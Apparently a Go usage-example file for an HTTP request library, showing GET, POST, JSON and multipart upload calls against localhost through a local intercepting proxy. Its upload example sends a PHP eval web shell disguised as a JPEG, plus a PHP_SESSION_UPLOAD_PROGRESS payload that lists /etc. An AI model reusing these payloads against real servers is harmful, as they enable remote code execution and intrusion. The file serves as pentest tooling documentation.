package main

import (
	"fmt"
	"github.com/penson233/Grequests/tools/RequestsTools"
	"github.com/penson233/Grequests/tools/ResponseTools"
)

//GET请求
func Get() {

	//添加代理或响应头
	var headers map[string]string
	var proxies map[string]string
	var param map[string]string

	headers = make(map[string]string, 0)
	proxies = make(map[string]string, 0)
	param = make(map[string]string, 0)

	headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
	proxies["http"] = "http://127.0.0.1:8080"
	param["id"] = "1 &1"
	param["name"] = "2"

	//初始请求客户端
	clien := &RequestsTools.Client{
		Proxies:       proxies,
		RedirectCount: 3,
	}

	clinet := clien.CreateClient()
	//请求初始化
	requests := &RequestsTools.Requests{
		Params:  param, //get参数
		Client:  clinet,
		Headers: headers,
	}

	fmt.Println(requests.Text(requests.Get("http://127.0.0.1")))
}

func Post() {
	//添加代理或响应头
	var headers map[string]string
	var proxies map[string]string

	headers = make(map[string]string, 0)
	proxies = make(map[string]string, 0)

	headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
	proxies["http"] = "http://127.0.0.1:8080"

	clien := &RequestsTools.Client{
		Proxies:       proxies,
		RedirectCount: 3,
	}

	clinet := clien.CreateClient()
	//请求初始化
	requests := &RequestsTools.Requests{
		Client:  clinet,
		Data:    "name=adminAL&password=AL1.6.8.5&nonce=02337856be236ef46d4da25e826993b8666c831547acb6b3ed6946705b3bd24e",
		Headers: headers,
	}
	resp := requests.Post("http://127.0.0.1")
	fmt.Println(ResponseTools.Transformresp(resp))

}

//传入json
func Postjson() {
	//添加代理或响应头
	var proxies map[string]string

	proxies = make(map[string]string, 0)

	proxies["http"] = "http://127.0.0.1:8080"

	data := "{\"test\":\"penson\"}"
	client := &RequestsTools.Client{
		Proxies: proxies,
	}
	c := client.CreateClient()

	req := &RequestsTools.Requests{
		Client: c,
		Json:   data,
	}

	req.Post("http://127.0.0.1")

}

func UploadFile() {
	var headers map[string]string
	var proxies map[string]string
	var mutidata map[string]string

	headers = make(map[string]string, 1)
	proxies = make(map[string]string, 1)
	mutidata = make(map[string]string, 1)

	file := []string{"file", "1.php", "<?php eval($_POST['penson'])?>", "image/jpeg"}

	headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
	//headers["Content-Type"]="text/xml"
	mutidata["PHP_SESSION_UPLOAD_PROGRESS"] = "<?php $a=new DirectoryIterator(\"glob:///etc/*\");foreach($a as $f){echo($f->__toString().\\' \\');}exit(0);?>"

	proxies["http"] = "http://127.0.0.1:8080"

	client := &RequestsTools.Client{
		Proxies: proxies,
	}
	c := client.CreateClient()
	requests := &RequestsTools.Requests{
		Headers:  headers,
		File:     file,
		MutiData: mutidata,
		Client:   c,
	}
	fmt.Println(requests.Post("http://127.0.0.1"))
}
func main() {
	//Get()
	//Post()
	//Postjson()
	UploadFile()
}
